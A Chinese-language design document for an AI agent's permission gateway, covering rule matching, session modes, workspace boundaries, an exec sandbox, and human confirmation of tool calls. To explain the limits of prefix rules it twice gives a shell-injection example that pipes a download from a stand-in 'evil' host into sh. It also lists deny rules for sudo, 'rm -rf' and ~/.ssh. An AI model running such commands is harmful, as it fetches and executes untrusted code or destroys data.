# permissions — 权限网关

## 职责

`packages/core/src/permissions/engine.ts` 的 `ConfigPermissionGate` 在每个工具调用执行前给出三档判定之一：`allow`（直接执行）、`deny`（拒绝并把原因回传模型）、`confirm`（交给人工确认）。判定由会话权限模式 + 配置规则 + 工具声明的 risk 元数据 + 会话工作目录驱动，**自身不做任何交互**——确认的等待、超时、事件广播在循环层（`packages/core/src/agent/loop.ts`），人工裁决的接收在确认网关（`packages/core/src/permissions/broker.ts` 的 `ConfirmationBroker`），"总是允许"裁决沉淀成规则的存取在 `packages/core/src/storage/decided-rules.ts`。

---

## 设计决策

- **三档输出、顺序短路**：判定链每一步都可能直接返回，后续不再看。会话模式 `readonly` 最优先——sensitive 工具在 readonly 下无条件拒绝，连白名单都不到达；其后顺序为 deny 黑名单 → allow 白名单（命中且目标不逃逸工作区）→ **沉淀规则命中（learned，目标不逃逸）** → 模式 `acceptEdits` 的工作区内写放行 → 工作目录越界检查 → safeTools → 会话级授权 → confirm。deny 永远先于放行：一条命中黑名单的调用无论白名单如何配置都不会执行；白名单也只在目标仍位于工作区内（按 realpath 判定，见第 4 节）时才优先于越界检查——经符号链接逃逸出工作区的目标回落 confirm，不因 allow 规则放行。
- **规则是扁平字符串，不是结构化对象**：`"exec:git *"` 这类前缀通配规则写在 `config.yaml` 里，人和模型都可读可写；编译只做一次切分，匹配用无正则的回溯算法。
- **匹配对象按工具提取**：exec 匹配命令字符串、写文件工具匹配路径、其余工具匹配整个参数的 JSON 文本——规则作用于"该调用要执行的动作"，而不是原始参数对象。
- **路径规则双向匹配**：规则同时按原始形态和规范化形态（`~` 展开 + 相对工作目录解析）测试，同一文件以不同写法（`~/.ssh/x` / `.ssh/x` / `/Users/u/.ssh/x`）均不能绕过 deny。
- **越界访问必须过人**：文件工具的目标一旦离开会话工作目录，即使工具本身是 safe（如 fs_read）也转为 confirm——"只读"不能作为读取任意系统文件的许可。沉淀规则与 acceptEdits 同样不豁免逃逸：两者的放行都以目标仍在工作区内为前提。
- **gate 与确认流程解耦**：gate 只签发 `conf_` 前缀的确认 id；发事件、计时、超时自动拒绝都归循环，broker 仅负责登记与裁决。两侧职责不重叠，事件也不会重复。
- **会话模式是唯一事实，宿主不设上限**：模式存在会话元数据（`meta.mode`）里，缺省 `default`；daemon 不再有全局只读启动旗标，每个会话独立切换（CLI Shift+Tab 或 `/mode`、WebUI 常驻选择器、`POST /sessions/:id/mode`）。

---

## 接口

```ts
// 判定结果（定义在 packages/core/src/agent/loop.ts，gate 实现它）
export type PermissionDecision =
  | { type: "allow"; reason: "safe" | "whitelist" | "session_grant" | "learned" | "accept_edits" | "sandboxed" | "trusted" }
  | { type: "deny"; reason: "blacklist" | "user_denied" | "timeout" | "readonly" | "mode"; noteText: string }
  | { type: "confirm"; confirmationId: string; noteText?: string }

// packages/core/src/permissions/modes.ts — 会话权限模式（严格在前）
export const PERMISSION_MODES = ["readonly", "default", "acceptEdits", "trusted", "auto"] as const
export type PermissionMode = (typeof PERMISSION_MODES)[number]
export function isPermissionMode(v: unknown): v is PermissionMode
export const PERMISSION_MODE_CONFIRMATIONS: Record<PermissionMode, string>  // 切换确认文案

export interface PermissionGate {
  check(toolCall: ToolCallBlock): Promise<PermissionDecision>  // 缺失 == 全放行
}

export interface CompiledRule { tool: string; argGlob?: string }
export function compileRule(s: string): CompiledRule
export function globMatch(pattern: string, s: string): boolean
export function extractArg(args: unknown, profile: PermissionProfile): string

export class SessionGrants {
  grant(rule: string): void
  hasMatch(tool: string, arg: string, workspace?: string, profile?: PermissionProfile): boolean
  size(): number
}

export class ConfigPermissionGate implements PermissionGate {
  constructor(cfg: KclawConfig["permissions"], opts?: {
    safeTools?: Set<string>        // 可自动放行的工具名集合
    toolFacts?: Map<string, { risk; argFields }>  // 工具注册事实表（risk + 参数字段名），
                                   // safeTools 之外的一切待遇由引擎按它派生（见"待遇派生"）
    grants?: SessionGrants         // run 级授权存储（批次 D 接线）：仅当 config 开启
                                   // sessionGrants 且会话模式非 auto 时被查询（auto 要从
                                   // 人工确认中学习，run 级免询会隐藏归纳信号）
    newConfirmationId?: () => string
    workspace?: string             // 会话工作目录，越界判定与路径规范化用它
    readRoots?: string[]           // 额外可读根：safe 的路径参数工具视同工作区（daemon 传附件目录）
    mode?: PermissionMode          // 会话权限模式，缺省 default（daemon 按会话 meta 逐 run 传入）
    decidedRules?: string[]        // 沉淀规则（"总是允许"产生的 allow 规则，每 run 从文件加载）
    sandboxAvailable?: boolean     // exec 沙箱可用性（daemon 由沙箱 provider 探测传入，
                                   // 与 exec 工具实际套的沙箱同源）：命令类工具无规则命中时，
                                   // 可用则 allow {reason:"sandboxed"}，否则 confirm
  })
  check(toolCall: ToolCallBlock): Promise<PermissionDecision>
}
```

配置来源（`packages/core/src/storage/config.ts`）：

```yaml
permissions:
  allow: []                          # 默认空
  deny: ["exec:sudo*", "exec:rm -rf*"]
  confirmTimeoutMs: 120000           # 确认等待上限，默认 120s
  sessionGrants: true                # 会话内"本次允许"记忆是否生效（run 级）
  defaultMode: default               # 新会话的初始权限模式（创建时固化为 meta.mode；缺省 default）
  # autoLearnThreshold: 3            # auto 模式归纳阈值（默认 3，0 关闭），见第 5 节
```

---

## 核心流程

### 1. 规则语法与匹配

`compileRule` 在**第一个冒号**处切分：`exec:git *` → `{tool: "exec", argGlob: "git *"}`（argGlob 自身可以含冒号）；裸字符串 `exec` 是工具级规则，不看参数。

`globMatch` 的语义：`*` 是唯一通配符，匹配任意字符序列**包括 `/`**（所以不需要 `**` 特例）；大小写敏感；实现是迭代式星号回溯，不编译正则。`exec:git *` 命中 `git diff`、`git status`，也命中 `git diff; curl evil | sh`（见"边界"）。

`extractArg` 决定规则比对哪段字符串，按工具的**待遇派生**（见下节）取：

| 工具待遇 | 匹配对象 |
|------|----------|
| 命令类（sensitive 且带 `command` 参数——exec） | `args.command`（命令字符串） |
| 路径写类（带 `path` 参数且 sensitive——fs_write/fs_edit） | `args.path` |
| 其它（含 fs_read/fs_list） | `JSON.stringify(args)` 整体 |

### 2. 判定链（`check` 的短路顺序）

```
⓪ 模式 readonly 且工具 risk 为 sensitive
                        → deny {reason:"readonly", noteText:"只读模式（readonly）"}
⓪' 模式 trusted（批次 C）
                        → 见下节「trusted 分支」：黑名单优先，边界内全放行、边界外全 deny
① deny 规则命中        → deny {reason:"blacklist", noteText:"规则命中黑名单: <原规则>"}
② allow 规则命中且目标不逃逸工作区 → allow {reason:"whitelist"}（命中但经符号链接逃逸出工作区 → 落到 ③）
②' 沉淀规则命中且目标不逃逸工作区 → allow {reason:"learned"}（逃逸 → 落到 ③）
②'' 模式 acceptEdits 且路径写类工具目标在工作区内 → allow {reason:"accept_edits"}
③ 越界检查（文件工具）  → confirm（见下，即使工具是 safe）
④ safeTools 含该工具    → allow {reason:"safe"}
⑤ sessionGrants 开启且授权命中 → allow {reason:"session_grant"}
⑥ 以上全不中            → confirm，签发新 conf_ id
```

**trusted 分支**（`mode === "trusted"`，在 readonly 短路之后、规则命中之前接管）：这是免审档——没有人工兜底，所以边界外一律**拒绝**而不是 confirm（fail-closed）。执行顺序：

1. deny 黑名单仍然最优先：命令类对每个归一化子命令分别匹配，路径类按 scopedMatch 匹配，命中即 `deny {reason:"blacklist"}`。
2. 命令类（仅 exec 被装配层真正包进 OS 沙箱，`sandboxedTools` 事实）：该工具被沙箱包裹且沙箱可用 → `allow {reason:"sandboxed"}`（整个 shell 调用进沙箱）；否则 → `deny {reason:"mode"}`——沙箱不可用或启用被关时 noteText 为"trusted 模式要求 exec 进沙箱，但沙箱不可用"，工具可沙箱化但未被包裹时（schema 带 `command` 字段的 MCP 适配器等）为"trusted 模式无法沙箱化该敏感工具"。**绝不让未包裹的工具顶着"已沙箱化"的名头在免审档裸跑**。
3. 路径类工具：目标逃逸工作区 → `deny {reason:"mode", noteText:"trusted 模式只放行工作区内的操作"}`；工作区内 sensitive 路径写（fs_write/fs_edit）→ `allow {reason:"trusted"}`、safe 路径读 → `allow {reason:"safe"}`。
4. safe 工具照常 `allow {reason:"safe"}`。
5. 无沙箱保护的 sensitive 工具（MCP 适配器、未注册工具）→ `deny {reason:"mode", noteText:"trusted 模式无法沙箱化该敏感工具"}`。

trusted 不 consult allow / 沉淀规则 / 会话授权——边界内本就全放行，它们没有存在意义；边界外 deny 也比任何 allow 都优先。

命令类工具（sensitive 且带 `command` 参数，exec 今天是唯一成员）走专属分支：deny 对**每个归一化子命令**分别匹配；allow、沉淀规则与会话授权只在命令**恰好一段**（无接续符）时参与——`exec:git status*` 不可能放行 `git status; …`。两分支都未命中时：**若 exec 沙箱可用（`sandboxAvailable`）→ `allow {reason:"sandboxed"}`**——沙箱（而非人工）是这次放行的批准方，整个 shell 调用都在沙箱内运行（含多段命令）；沙箱不可用才 confirm。sandboxed 永远不覆盖 deny 与规则命中，readonly 的 ⓪ 步短路依旧最优先。沉淀规则的 exec 形态在落盘时即收窄为"首词 + 子命令前缀"（`exec:git push*`，见沉淀规则一节），匹配语义与 allow 一致。

### 3. 路径规范化匹配（防拼写绕过）

对**路径写类工具**（带 `path` 参数且 risk 为 sensitive——`fs_write`/`fs_edit`），规则命中判定依次测三步，前一步不中才走下一步：

1. 按原始参数串直接测。
2. 参数转成规范化形态——`~`/`~/` 展开为家目录、再 `path.resolve(workspace, p)` 解析成绝对路径（与 fs 工具实际写文件前的解析完全一致）——用规范化后的 arg 对原始 glob 测一次。
3. 把 **glob 本身也规范化**后再测一次。

结果：deny `fs_write:~/.ssh/**` 同时拦截 `~/.ssh/x`、`.ssh/x`（workspace 为家目录时）、`/Users/u/.ssh/x`、`~/./.ssh/x`——它们解析到同一个文件。

### 4. 会话工作目录边界

凡是带 `path` 参数的工具（`fs_read`/`fs_list`/`fs_write`/`fs_edit`），其 `path` 参数都做越界判定：按上面的方式展开解析后，`resolved` 既不等于工作目录根、也不以 `根 + 路径分隔符` 开头，即视为越界 → **直接 confirm**。要点：

- 位置在 deny/allow **之后**：黑名单与白名单的优先级更高，先判完才轮到边界——但白名单的"放行"只覆盖不逃逸的目标（见下条）。
- **allow 命中不豁免逃逸**：白名单规则命中（词面路径匹配）但目标经符号链接（symlink）逃逸出工作区（realpath 形式）时，**不再直接放行**，回落到本步的越界确认——一条 `fs_write:link/**` 规则不会放行 `link/secret.txt`（若 `link` 指向工作区外的目录），越界目标对 allow 规则一律不生效，只能走确认或人工在会话中授权。这是有意收紧：allow 的授权范围不超出工作区边界。
- safe 工具不豁免：fs_read/fs_list 越界同样要人确认——唯一例外是 `readRoots`（见下节）。
- 工作目录本身允许（`resolved === root`，如对根目录 fs_list）。
- 工作目录未设置时不做该检查（legacy 行为）；daemon 侧的取值是会话元数据的 `workdir`，缺省回退 `config.workspace`（run 装配 core `executeRun`）。

exec 没有可判定的"目标路径"——命令可以以任何方式访问文件系统，所以对 exec **没有越界精确判定**，处理策略是：命中 deny/allow 之外，若 exec 沙箱可用则整条命令在沙箱内自动放行（见第 7 节），否则 confirm，由人工审视命令本身。

### 5. 会话权限模式与附件读豁免

gate 的两个 daemon 侧输入（都来自 `ConfigPermissionGateOptions`）：

- **mode（会话权限模式）**：`PERMISSION_MODES = ["readonly" | "default" | "acceptEdits" | "trusted" | "auto"]` 五档，存在会话元数据 `meta.mode`，缺省 `default`；daemon 创建的新会话（HTTP `POST /sessions` 与任务调度建会话）把 `config.permissions.defaultMode` 的当前值**固化为初始 mode**（事件流 `session.created` 带 `mode` 字段，旧流无该字段则读时缺省 default）——改 config 默认只影响之后新建的会话；run 装配每 run 从会话 meta 读出传入 gate。各档语义：
  - *readonly*：**risk 为 sensitive 的工具**（由 risk 直接派生，引擎不持名单——今天恰为 `fs_write`/`fs_edit`/`exec` 三个）在判定链第 ⓪ 步直接拒绝——reason `"readonly"`、note 文案 `只读模式（readonly）`，工具得到 error result 并随 tool 消息落一个 `kind:"denied"` note；读、web 与 memory 工具不受影响。短路排在一切规则之前：白名单里的 `allow: exec:*` 在只读下同样不执行——这个模式承诺的是零写入风险。
  - *default*：默认档，判定链照常走（本节其余内容描述的就是它）。
  - *acceptEdits*：工作区内的文件写入免逐次确认——判定链第 ②'' 步对**路径写类工具**（带 `path` 参数且 sensitive）的目标做工作区内检查，通过即 `allow {reason:"accept_edits"}`；越界目标与 exec 等命令类工具不受益，仍走 confirm。
  - *trusted*（批次 C）：免审档——沙箱与工作区边界内的操作全部自动放行、不弹确认；边界外（exec 无法沙箱化、越界、无沙箱保护的 sensitive 工具）一律拒绝（fail-closed，见第 2 节「trusted 分支」）。前提是 exec 沙箱可用（`config.sandbox.enabled` 默认开）：沙箱不可用或未启用时，trusted 下的 exec 直接 deny——免审档没有人工兜底，拒绝是唯一安全出路。
  - *auto*（批次 C）：判定链与 default 相同，额外叠加**规则归纳**：auto 会话里同一个操作（同一收窄键）被连续 `once` 批准 N 次（`config.permissions.autoLearnThreshold`，默认 3，0 关闭）后，自动把该操作沉淀为一条 `source:"auto"` 的项目档规则（落盘位置与手动"总是允许"相同，下个 run 起生效）；任何一次 `reject` **或超时**清零该键的计数——"拒绝"（含沉默的超时拒绝）是明确信号，不许被更早的放行覆盖。计数在进程内、**键按会话隔离**（跨会话的批准互不叠加；daemon 重启即清零，跨会话持久化是文档化后续项）；`project`/`global` 裁决不参与计数（那是显式的"总是允许"，无需归纳）；沙箱自动放行的调用也从不计数——归纳只针对人工裁决。**auto 模式不消费 run 级会话授权**（见第 11 节）：run 级免询会吞掉同一 run 内的重复确认、让归纳看不见连续的人工放行，所以即使 sessionGrants 开启、授权存储已就位，auto 会话仍逐次确认直到归纳落盘。auto 模式本身不自动放行任何东西，它只是把反复的人工批准变成规则。
  - 切换入口：CLI 的 Shift+Tab 循环与 `/mode` 命令、WebUI 的常驻选择器，最终都落到 `POST /sessions/:id/mode`（事件溯源写入：追加一条 `session.set` 事件进会话事件流并折进 meta 投影，`GET /sessions/:id/events` 可见，不做 WS 广播）；下一次 run 起生效。旧版 `POST /sessions/:id/readonly` 已移除，读兼容见下。
  - **legacy 读兼容**：投影 `meta.json` 里旧的 `readonly: true` 读出时映射为 `mode: "readonly"`（布尔删除）；事件流里旧的 `session.set {readonly}` 同样映射。写入端只产 `mode`。
  - daemon 级只读启动旗标（`--readonly`）已随本批移除：模式是会话级事实，宿主不再设全局上限。
- **readRoots**：额外可读根列表。**safe 的路径参数工具**（按「带 `path` 参数且非 sensitive」派生——今天为 `fs_read`/`fs_list`）的目标落在其中任一根之内时不算越界（免确认）；写类工具永不豁免。daemon 装配传 `[<home>/attachments]`——上传的附件对会话而言就是"工作区的一部分"，模型用 fs_read 读取它无需逐次人工放行。

### 6. 工具待遇怎么派生（引擎不持名单）

引擎 `engine.ts` 里没有任何具体工具名。run 装配（core `executeRun`）把注册表的两样既有事实——每个执行器的 `risk` 与参数 schema 的字段名（`deriveToolFacts`，tools 注册表旁导出）——连同 `risk === "safe"` 派生的 `safeTools` 一起传入 gate；引擎内的 `permissionProfile` 从事实推导该工具的全部待遇：

| 待遇 | 派生规则 | 今天的成员 |
|------|----------|------------|
| safeTools 自动放行 | `risk === "safe"` | fs_read、fs_list、web_search、web_fetch、memory_save、memory_search、session_search、skill_read |
| readonly 无条件拒绝 | `risk === "sensitive"` | exec、fs_write、fs_edit |
| 路径规范化双匹配（防拼写绕过） | 带 `path` 参数且 sensitive | fs_write、fs_edit |
| 工作目录边界检查 | 带 `path` 参数 | fs_read、fs_list、fs_write、fs_edit |
| readRoots 读豁免 | 带 `path` 参数且 safe | fs_read、fs_list |
| 规则匹配取 `command` 字段 | 带 `command` 参数（即命令类，走专属分支） | exec |

**新工具因此零引擎改动**：按惯例把写参数命名为 `path`（或命令参数命名为 `command`）并声明 risk，待遇自动齐备——漏声明的缺省是最严待遇（不进 safeTools、无豁免，需确认）。未注册工具（模型幻觉调用不存在的名字）按同样最严缺省处理。结构约定优于名单：名单漏一个名字是漏洞，结构让新工具天然入网。按当前 11 个内置工具的声明（见 [tools](./tools.md)）：

- **safe（命中即自动放行）**：`fs_read`、`fs_list`、`web_search`、`web_fetch`、`memory_save`、`memory_search`、`session_search`、`skill_read`——共 8 个，全是不改工作目录状态的 parallel 工具；
- **sensitive（无 allow 规则命中必然 confirm）**：`exec`、`fs_write`、`fs_edit`——共 3 个。注意 fs_read/fs_list 虽是 safe，目标越界且不在 readRoots 内时仍进入 confirm（第 ③ 步）；MCP 适配器工具（见 [mcp](./mcp.md)）一律声明 sensitive。

### 7. exec 沙箱（OS 层，批次 A）

`exec` 的工具执行被一层操作系统沙箱包裹，作为权限确认之下的**纵深防御**：命令即使获准运行，也被限制在受控范围内（模型被注入时，确认挡不住命令内部的动作，沙箱兜底）。这是权限机制里唯一的新模块，其余都是既有入口的参数扩展。

- **模块**：`packages/core/src/sandbox/provider.ts` 的 `createExecSandbox`（探测 + 包装，不做业务判定）。平台布局：
  - macOS `sandbox-exec` + SBPL profile——工作区与系统临时目录可写，家目录只读且 `~/.kclaw` 读拒绝（凭据隔离），网络默认允许（SBPL 规则按先匹配生效：`~/.kclaw` 读拒绝在宽放行之前、写白名单在兜底 deny 之前；路径一律 realpath 形态，`/tmp` 写作 `/private/tmp`）。
  - Linux bubblewrap（无特权 user namespaces）——整个根只读挂载、`~/.kclaw` 用 tmpfs 遮蔽（读不到凭据）、`/tmp` 与工作区可写、`--die-with-parent --new-session` 保证 exec 超时进程组 kill 能波及整棵进程树；**v1 不加 `--unshare-net`**（网络默认允许是拍板决策）。
  - 降级链：bwrap → **不可用**（回落人工确认，fail-closed——绝不让命令裸跑）。Landlock 兜底是后续项：纯 Node 无法发起 `landlock_create_ruleset` syscall，也没有成熟 CLI 包装。
- **判定联动（`sandboxAvailable` + `sandboxedTools`）**：run 装配探测一次沙箱可用性，同源喂给两个消费方——exec 工具的实际包装器（可用的才注入）与 gate 的 `sandboxAvailable` 输入——并把**实际被包裹的工具集**（`sandboxedTools`，今天只有 exec）一并传给 gate。因此 "sandboxed" 放行的命令必然真被沙箱包住；反之沙箱不可用时 exec 维持 confirm，不会出现"放了行却裸跑"的错配。`default` 与 `acceptEdits` 模式下，被包裹的命令类工具无规则命中时由沙箱顶替人工（reason `sandboxed`）；trusted 模式下未包裹的命令类工具（schema 带 `command` 字段的适配器等）直接被 deny，绝不顶着"已沙箱化"的名头放行。readonly 的短路依旧最优先，deny/allow/沉淀规则/会话授权也都先于它。沙箱**启用但探测不可用**时，exec 回落的确认请求会带一条说明（`noteText`："exec 沙箱不可用，本次操作需人工确认"，CLI 暗色一行、WebUI 卡片注明，见第 8 节）；用户主动 `sandbox.enabled: false` 关闭沙箱时不带说明——那是刻意决定，不需要解释。
- **配置**（`config.yaml` 的 `sandbox:` 节，daemon 级，默认开）：
  ```yaml
  sandbox:
    enabled: true        # 整体开关
    writeRoots: []       # 追加写白名单（realpath 形式），如 npm 缓存目录
  ```
  沙箱启动失败或命令被沙箱拒绝 → exec 返回 error result（fail-closed，不降级裸跑）。可执行性探测用真实路径探测（如 `bwrap --die-with-parent true` 验证 user namespaces 真可用）。
  - **审计（批次 D）**：run 装配在每次探测后向会话事件流落一条 `sandbox.checked` 审计事件（第 10 种会话事件，字段 `enabled`=config 开关 / `available`=探测结果 / `unavailableReason`=原因；主动关闭沙箱时 `available` 恒 false 且不带原因）。每 run 恰一条，只落盘不上总线、不进 meta 投影、不推进 updatedAt，写失败即 run 失败（与 `system` 审计事件同契约）——审计页可逐 run 回看"当时沙箱是什么状态"，配合 grantedBy / deny note 串成完整审计链（见 [webui](./webui.md)）。

### 8. 人工确认流程

```
gate 签发 confirmationId（newId("conf")，前缀 + 单调 ULID——按时间递增、可排序的唯一 ID）
  → 循环发 confirmation.requested {confirmationId, toolCall, risk, expiresAt = 现在+confirmTimeoutMs}
     （exec 沙箱启用但不可用时的回落确认带 noteText，见第 7 节）
  → 三方竞速等待（raceConfirmation）：人工裁决 | confirmTimeoutMs 超时 | run 取消信号
      ├ once     → 执行，grantedBy = "confirmed"
      ├ project  → 执行 + 沉淀项目档规则，grantedBy = "confirmed"
      ├ global   → 执行 + 沉淀全局档规则，grantedBy = "confirmed"
      ├ reject   → error result "用户拒绝了该操作" + note 块 kind "denied"
      ├ 超时     → error result "确认超时，操作未执行" + note 块 kind "timeout"
      └ 取消     → 不发 confirmation.resolved；工具得 "run aborted before execution"，run 以 aborted 收尾
  → 循环发 confirmation.resolved {confirmationId, decision: "once"|"project"|"global"|"reject"|"timeout", by}
```

- 超时默认 `confirmTimeoutMs = 120_000`（config 默认值与循环的内置默认值一致，均为 120 秒）。
- 人工裁决是**四选一**（`ConfirmationDecision = "once" | "project" | "global" | "reject"`）：仅本次、总是（本项目）、总是（全局）、拒绝。CLI 的确认提示是 @clack 四项选择（`--yes`/`--no` 脚本旗标分别映射 once/reject）；WebUI 是确认卡上的四个按钮。
- 确认网关 `ConfirmationBroker`（`packages/core/src/permissions/broker.ts`）：
  - 登记：run 装配（core `executeRun`）的包装 gate，confirm 判定一出就在 broker 登记（携带 toolCall、risk、会话 id）。
  - 裁决：CLI/Web 经 WS `confirmation.resolve` 帧调 `broker.resolve(id, decision, by)`（`by` 默认 `"cli"`，WebUI 帧带 `client:"web"`）。裁决返回布尔——unknown/stale id 落空。
  - 沉淀的落盘在 server 侧 WS 入口（`packages/server/src/ws.ts`）：resolve 之前先 `broker.lookup(id)` 快照 toolCall 与会话（resolve 会移除条目），`project`/`global` 裁决才落盘；`once`/`reject`/未知 id 不写任何文件。项目档的目标工作目录取会话元数据的 `workdir`（缺省回退 daemon 配置的工作目录）。
  - **auto 模式归纳在装配层（不在 WS 入口）**：run 装配（core `run-assembly.ts`）的 `resolveConfirmation` wrapper 能看到**每一种**裁决结局——`once`/`reject` 经网关、**超时**在竞速内自行到期——这是 WS 命令分发层做不到的（超时永不产生 resolve 帧）。当裁决所属会话的模式是 `auto`（用 run 启动时的快照，不是 resolve 时刻的实时值，避免切模式竞态）时：`once` 裁决先喂给 `AutoLearnCounter`（core 纯内存类，键 = `sessionId + 收窄键`，按会话隔离，见第 5 节 auto 档）——跨过阈值即落盘一条 `source:"auto"` 的项目档规则（best-effort，写失败只记日志不打断 run）；`reject` **或超时**清零该键计数；abort（run 取消）不是拒绝、不碰计数。同一 seam 里，`once` 裁决还会把收窄规则写入**本次 run 的授权存储**（`grants.grant`，批次 D 接线，见第 11 节）——auto 模式下 gate 不消费它，属死写，无副作用。判定链与规则引擎完全不知道 auto 的存在——归纳发生在裁决侧，规则落盘后由既有机制生效。WS 入口只保留 `project`/`global` 的"总是允许"落盘。
  - broker **不发事件、不设内部超时**——事件归循环，计时归循环与装配侧的同一竞速机制；两处用同一超时值竞速保证视图一致。
  - 超时/取消后 run 装配（core `executeRun`）的 `resolveConfirmation` 调 `expire` 把条目标记失效，迟到的裁决只会收到 unknown confirmation，不会确认一个已无人等待的动作。
- deny 的 `user_denied` / `timeout` 两个 reason 不是 gate 产出的：gate 只产生 `blacklist` / `readonly` 两种拒绝（规则命中或只读会话禁写/exec），前两者是循环把人工拒绝/超时转成 error result 时的语义标记（note 块的 `kind`）。

### 9. 沉淀规则（decided rules）

人工在确认里选"总是允许"后，一条**收窄的 allow 规则**落盘为 YAML 文件（`packages/core/src/storage/decided-rules.ts`），下一个 run 起由 gate 的 `decidedRules` 输入加载（判定链第 ②' 步，reason `"learned"`）：

- **两个文件，各自独立**：项目档 `<workspace>/.kclaw/permissions.yaml`（裁决所属会话的工作目录）、全局档 `~/.kclaw/permissions.yaml`。config.yaml 保持纯手写，程序从不写它。
- **每条带出处**（`DecidedRuleEntry`）：`rule`（收窄后的规则）、`decidedAt`（ISO 时刻）、`origin`（触发裁决的工具名、原始参数 JSON、会话 id）、`source`（可选——`"auto"` 表示 auto 模式归纳，缺省即 `"manual"`，兼容没有该字段的旧文件）。文件 0600 权限，原子写入。
- **规则收窄（`narrowDecidedRule`）**：exec 按"首词 + 子命令前缀"收窄——`git push origin main` 落成 `exec:git push*`，`git fetch` 落成 `exec:git fetch*`（两词命令保留前两词 + 前缀）；**单词命令精确形态**（`ls` 落成 `exec:ls`）；链式命令只取第一段；命令 token 折叠为 basename（`/bin/rm -rf build` → `exec:rm -rf*`）。路径写类工具落 **realpath 精确路径**（`fs_write:/w/proj/a.md`，只放行这一个文件）；其余工具落工具级规则（如 `mcp__srv__do`）。收窄宁紧勿松：人批准的是那一条命令，不是一个命令族（前缀形态是可用性折衷——覆盖 `git push origin main` 与 `git push origin dev` 这类同族变体，代价是 `git push --force` 这类带旗标变体也会被前缀放行；拒绝的是更宽的命令族）。
- **项目文件本地专属（防御三件套）**：落盘时自动把 `.kclaw/permissions.yaml` 追加进工作区 `.gitignore`；已被 git 跟踪的项目规则文件**整体忽略**（`loadDecidedRulesForRun` 检测 `git ls-files`，tracked 即不加载并在 daemon 日志告警）——克隆来的仓库无法夹带一份预授权清单；文档（本节）写明该行为。管理页（WebUI 权限页）对 git 跟踪的项目档显示"已被跟踪、规则不生效"的提示（`GET /permissions/rules` 返回 `tracked`/`ignored` 字段，两者恒等，规则列表恒空）。
- **每 run 加载（`loadDecidedRulesForRun`）**：run 装配时读两档文件合并为规则串数组传 gate；删除文件里的条目（或整个文件）即收回授权，对下一个 run 立即生效。管理入口：WebUI「权限」页（`GET /permissions/rules` 列表、`DELETE /permissions/rules` 单条删除，项目档支持 `?workspace=` 指定）。

### 10. grantedBy 记录

每个被放行的调用都会把原因记在 tool 消息上：`ToolMessage.grantedBy: Record<callId, GrantedBy>`（`packages/core/src/protocol/messages.ts`，`GrantedBy = "safe" | "whitelist" | "session_grant" | "confirmed" | "accept_edits" | "learned" | "sandboxed" | "trusted"`）。这是完整的执行审计链——事后可逐调用追溯"这次执行的授权来源"；`learned`/`accept_edits` 两个值分别对应沉淀规则放行与 acceptEdits 模式放行，`sandboxed` 对应 exec 沙箱顶替人工的放行，`trusted` 对应 trusted 模式对工作区内写操作的放行。Web 端审计视图（`packages/web/src/audit/AuditView.tsx`）就按 callId 反查该字段渲染批注。

### 11. 会话级授权（SessionGrants，批次 D 接线）

`SessionGrants` 是进程内存、**单 run 有效**的授权存储：run 装配（core `executeRun`）在 `config.permissions.sessionGrants === true` 时每 run 新建一个实例传入 gate，run 结束即弃（类名早于 run 级语义，行为以本文为准）。写入在装配层的 `resolveConfirmation` seam（与 auto 归纳同处，互不干扰）：一次 `once` 裁决把该调用的收窄规则 `grant()` 进存储；`project`/`global`（已落盘沉淀规则，无需授权）、`reject`、超时一律不写。

消费在 gate 判定链第 ⑤ 步（reason `"session_grant"`）：**同一 run 内**相同调用（同一收窄规则）不再弹确认。下一条消息重新询问——跨 run 的持久免询仍由沉淀规则承担，SessionGrants 从不产生长期豁免。

**auto 模式例外**：gate 在 `auto` 会话里跳过授权咨询（无论存储是否已就位）。auto 的契约是从人工确认中学习，run 级免询会吞掉同一 run 内的重复确认、破坏「连续 N 次 once → 归纳」（含单 run 内 N 次的批次 C 语义）——所以 auto 下重复调用仍逐次确认，直到归纳落盘。装配 seam 的写入保持无条件（auto 模式下是死写，无害），判定收敛在 gate（模式语义归引擎）。

---

## 边界与出错

- **deny 不防 shell 注入**：exec 的规则匹配的是命令字符串本身，`exec:git diff*` 同样命中 `git diff; curl evil | sh`。白名单只应放前缀可信的命令；真正的防线是默认的 confirm 档——人工可查看完整命令。
- **readonly 模式短路一切放行路径**：包括 allow 白名单、沉淀规则与会话授权；它不是一条 deny 规则（写不进 config），而是会话模式开关。
- **沉淀规则的授权范围以工作区为界**：learned 放行只在目标不逃逸工作区时生效（与 allow 同一豁免规则）；exec 沉淀规则落盘时收窄为首词 + 子命令前缀，删除规则或整个文件即收回授权。
- **规则大小写敏感**，`*` 之外无其它通配符（`?`、`[]` 都是字面字符）。
- **SessionGrants 是进程内存且单 run 有效**：每 run 新建、run 结束即弃，daemon 重启即清空；且历史 grantedBy 记录不受影响（那是持久化在会话日志里的）。
- **gate 缺失 = 全放行**：循环对未注入 `permissions` 的调用一律 `{type:"allow", reason:"safe"}`——组装宿主时漏配权限网关等于没有权限检查，daemon 装配始终注入。
- **exec 沙箱是放行的批准方，不是额外的确认**：`sandboxed` 只在无规则命中、本应 confirm 的落点上生效；deny/allow/沉淀规则/会话授权的优先级都高于它，readonly 的短路也依旧最优先。
- **trusted 免审档没有人工兜底**：边界外一律 deny——exec 沙箱不可用、路径越出工作区、无沙箱保护的 sensitive 工具（MCP 适配器、未注册工具）在 trusted 下都会被拒绝而不是交给人工；deny 黑名单仍然最优先。开着沙箱才应该用 trusted。
- **auto 归纳只针对人工裁决**：沙箱自动放行（`sandboxed`）的调用从不计数——那没有经过人的判断，归纳它等于把沙箱当作授权人；`project`/`global` 是显式"总是允许"，也从不计数。计数是进程内存、**键按会话隔离**（`sessionId + 收窄键`，跨会话批准互不叠加），daemon 重启即清零（文档化后续项：跨会话持久化）。
- **沙箱不可用不裸跑**：平台工具缺失、user namespaces 被禁或沙箱启动失败时，exec 回落人工确认或返回 error result（fail-closed）；可用性探测在每 run 装配时做一次，探测失败会写 daemon 日志（仅观察，不打断 run）。
- **v1 网络默认允许**：沙箱只隔离文件系统（凭据遮蔽 + 写范围），git clone / npm install / curl 照常；网络收窄留后续迭代。
- **越界检查依赖 workspace 正确**：会话 `workdir` 决定了越界判定的边界；创建会话时不传 workdir 则落到 `config.workspace`（daemon 启动目录的默认值是进程当前目录）。

---

## 关联

- [agent-loop](./agent-loop.md)：确认的竞速等待、note 块与 grantedBy 的写入现场
- [tools](./tools.md)：risk/concurrency 元数据的来源与 11 个工具清单；exec 工具的沙箱注入参数
- [sandbox](./sandbox.md)：exec 沙箱 provider 的平台布局与降级链（批次 A 唯一新模块）
- [storage](./storage.md)：decided-rules 文件的磁盘布局（会话容器之外）
